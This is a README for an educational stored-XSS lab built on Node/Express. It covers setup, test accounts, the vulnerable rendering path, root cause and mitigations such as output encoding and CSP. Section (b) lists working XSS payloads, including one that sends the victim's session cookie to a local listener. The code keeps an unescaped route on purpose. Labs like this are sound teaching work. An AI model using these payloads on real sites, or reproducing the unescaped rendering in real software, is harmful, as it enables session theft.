# Stored XSS Lab (Node/Express)

## Ownership (Table 3)
| Member name | Roll number | Category | Variant implemented |
|---|---|---|---|
| <your name> | <your roll no> | Cross-Site Scripting (XSS) | Stored XSS |

## Run
```
npm install
node server.js        # terminal 1 -> http://localhost:3000
node listener.js      # terminal 2 -> http://localhost:9000
```
Users: `alice / alice123` (attacker), `admin / admin123` (victim).
Use two different browsers (or one normal + one private window) so the sessions don't mix.
Visit `/reset` to clear comments between takes.

## (a) Vulnerable code
`server.js`, inside `board()`: when `isVuln` is true, `c.text` is placed into the HTML as-is.

## (b) Exploit payloads (post as alice at /vulnerable, view as admin)
1. Execution: `<script>alert(document.domain)</script>`
2. Persistence: reload / log in as another user; it fires again with no re-submission.
3. Impact (cookie theft): `<img src=x onerror="new Image().src='http://localhost:9000/?c='+document.cookie">`
   The admin's `sid` cookie shows up in the listener terminal.

## (c) Root cause
User input is stored and later rendered into HTML without output encoding, so the browser treats attacker data as markup and runs it in the victim's origin.

## (d) Mitigation implemented: context-aware HTML output encoding
`escapeHtml()` in `server.js`, applied on output in `/secure`. The same payloads now show as literal text.
(Screenshots: `screenshots/blocked-*.png`)

## (e) Other mitigations (theory)
- **Framework auto-escaping:** templating engines encode by default; safe unless you opt out (`|safe`, `dangerouslySetInnerHTML`).
- **Sanitiser for rich HTML (DOMPurify/bleach):** allow-lists tags/attributes; needed only when users must submit HTML.
- **Content Security Policy:** blocks inline scripts and restricts script sources; defense in depth, not a root-cause fix.
- **HttpOnly cookies:** JS cannot read the session cookie, so theft fails, but XSS can still act as the user.
- **Safe DOM sinks:** use `textContent` instead of `innerHTML` so data is never parsed as markup.

> For educational use on localhost only.
